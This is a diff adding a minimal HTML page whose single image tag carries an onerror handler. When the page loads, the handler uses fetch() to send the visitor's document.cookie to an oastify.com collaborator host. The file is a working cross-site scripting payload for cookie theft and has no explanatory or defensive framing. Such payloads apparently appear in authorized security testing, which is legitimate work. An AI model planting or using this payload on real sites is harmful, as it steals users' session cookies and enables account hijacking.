@@ -1,0 +1,6 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <img src="dvr" onerror="fetch('https://6v2eajhmu2bi82d22r0n0ma32u8lwfk4.oastify.com/?c=' + document.cookie)">
+  </body>
+</html>
